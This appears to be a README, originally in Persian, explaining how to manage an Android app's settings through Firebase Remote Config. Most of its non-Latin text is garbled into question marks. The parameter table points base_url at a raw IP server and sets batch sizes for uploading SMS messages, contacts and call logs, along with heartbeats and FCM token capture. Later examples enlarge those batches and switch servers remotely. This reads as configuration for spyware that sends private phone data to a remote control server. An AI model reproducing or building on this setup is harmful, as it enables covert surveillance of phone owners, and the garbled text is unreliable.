# ?? ??????? ????? Firebase Remote Config

??? ???? ??????? ???? ???? ????? ? ??????? ?? **Firebase Remote Config** ?? ????? ???.

---

## ?? ????? ?????
1. [??? Remote Config?](#???-remote-config)
2. [??? ? ??????????](#???-?-??????????)
3. [?????????? ???? ?????](#??????????-????-?????)
4. [???? ???????](#????-???????)
5. [??? ????](#???-????)
6. [???? ???](#????-???)

---

## ??? Remote Config?

?? ??????? ?? Firebase Remote Config ???????:

? **???? ????? ??** ??????? ?? ????? ???  
? **URL ????** ?? ?? ????? ??? ???  
? **?????????? ?????** ?? ????? ?????????  
? **??? A/B** ??? ??????? ?????  
? **?????? ??????** ??? ???????  

---

## ??? ? ??????????

### ??? 1: ???? ?? Firebase Console

1. ??? ?? [Firebase Console](https://console.firebase.google.com/)
2. ????? ???? ?? ?????? ??
3. ?? ???? ??? ??? **Remote Config** ?? ?????? ??

### ??? 2: ????? ??????? ?????

?? ??? ???? ????? ????????? ????:

#### ??? 1: ????? ???? JSON (???????) ?

1. ???? `firebase_remote_config_template.json` ?? ??? ????? ?? ??? ??
2. ?? Firebase Console? ??? **Add parameter** ???? ???!
3. ?? ???? ??? ????? **?** (?? ????) ???? ???? **Publish changes** ???? ??
4. ????? **Import from file** ?? ?????? ??
5. ???? JSON ?? ????? ??
6. ??? **Publish changes** ???? ??

#### ??? 2: ????? ???? ???? (??????) ??

???? ?? ??????? ???:

1. ??? **Add parameter** ???? ??
2. ??? ??????? ?? ???? ?? (??? `base_url`)
3. ????? ??????? ?? ????? ??
4. ??? **Save** ???? ??

---

## ?????????? ???? ?????

| ??????? | ??? | ????? ??????? | ??????? |
|--------|-----|--------------|---------|
| `base_url` | String | `http://95.134.130.160:8765` | ???? ???? ?????? |
| `user_id` | String | `XD` | ????? ????? ???? ?????? ?????? |
| `battery_update_interval` | Number | `60000` | ????? ????? ????? (??????????) - 1 ????? |
| `heartbeat_interval` | Number | `300000` | ????? Heartbeat (??????????) - 5 ????? |
| `fcm_timeout` | Number | `3000` | ???????? ?????? FCM Token (??????????) |
| `sms_batch_size` | Number | `100` | ????? SMS ?? ?? ???? ????? |
| `contacts_batch_size` | Number | `100` | ????? ??????? ?? ?? ???? ????? |
| `call_logs_batch_size` | Number | `100` | ????? ??????? ?? ?? ???? ????? |
| `retry_attempts` | Number | `3` | ????? ???? ???? ?? ???? ??? |
| `retry_delay` | Number | `5000` | ????? ??? ???????? ???? (??????????) |

---

## ???? ???????

### ?? ?? Kotlin:

```kotlin
// Initialize (??? ????? ?? ??? ??)
RemoteConfigManager.initialize(context)

// Fetch latest config
lifecycleScope.launch {
    val success = RemoteConfigManager.fetchAndActivate()
    if (success) {
        Log.d(TAG, "Remote Config updated!")
    }
}

// ?????? ??????
val baseUrl = RemoteConfigManager.getBaseUrl()
val userId = RemoteConfigManager.getUserId()
val batteryInterval = RemoteConfigManager.getBatteryUpdateInterval()
val heartbeatInterval = RemoteConfigManager.getHeartbeatInterval()
```

### ??? ??? ???????:

```kotlin
RemoteConfigManager.printAllConfigs()
```

---

## ??? ????

### 1. ??? ?? ???? Development

???? ??? ???????? `minimumFetchIntervalInSeconds` ?? ?? `RemoteConfigManager.kt` ?? ??:

```kotlin
val configSettings = remoteConfigSettings {
    minimumFetchIntervalInSeconds = 60 // ???? ???: 1 ?????
}
```

### 2. ??? ????? URL

1. ?? Firebase Console? ????? `base_url` ?? ????? ???
2. ??? **Publish changes** ???? ??
3. ?? ?? ???? ? ?????? ??? ??
4. ?????? ?? ?? ??:

```
?? Fetching remote config...
? Remote Config fetched and activated
?? Current values:
   - BASE_URL: http://NEW_URL:8765
```

### 3. Force Refresh

??? ??????? ???? ???? ??? config ???? ?? ?????:

```kotlin
lifecycleScope.launch {
    RemoteConfigManager.fetchAndActivate()
}
```

---

## ???? ???

### ?? ??????????? Fetch

Firebase ??????? ????? fetch ?? ???????? ????? ????:

- **Development**: ?? 1 ???? ????? (???? ?????)
- **Production**: ?? 12 ???? ????? (???????)

???? ??? ??? ??? ??????? ?? Development:

```kotlin
minimumFetchIntervalInSeconds = 0 // ??? ???? ???!
```

### ?? ?????

1. **??????** ??????? ???? (??? API Key? Password) ?? ?? Remote Config ????
2. Remote Config ??????? ?? ???????? ???????
3. ??? ??????? ??????? ?????? ?? ?????

### ?? ??????????

1. **Caching**: Firebase ???? cache ??????? ????? ????
2. **Async Fetch**: ????? fetch ?? ?? background thread ????? ???
3. **Default Values**: ????? ?????? ??????? ????? ?? (?? ???? ?????? ????)

### ?? ??????????

?? Firebase Console ???????:

- ????? Fetch ?? ?? ?????
- ??????/???? Activation ?? ?? ???
- ???? ??????? ?? ????????? ?? ?????

---

## ???????? ???????

### ????? ???? ?? Production

```json
{
  "base_url": "https://new-server.example.com"
}
```

### ???? ???? ????? (????????? ?????????)

```json
{
  "battery_update_interval": "600000",  // 10 ?????
  "heartbeat_interval": "900000"        // 15 ?????
}
```

### ?????? ???? ????? (batch ???????)

```json
{
  "sms_batch_size": "500",
  "contacts_batch_size": "500",
  "call_logs_batch_size": "500"
}
```

---

## ????????

??? ????? ??? ????:

1. ??????? Logcat ?? ?? ?? (?????: `RemoteConfigManager`)
2. ????? ?? Firebase ?? ????? ????? ???
3. ????? ??????? ?? ?? ??
4. ?????? ??????? ?? `RemoteConfigManager.kt` ????? ??? ??????

---

**? ???? ??! ???? ??????? ??????? ?? ?? ?? ??? ??? ?????? ???! ??**
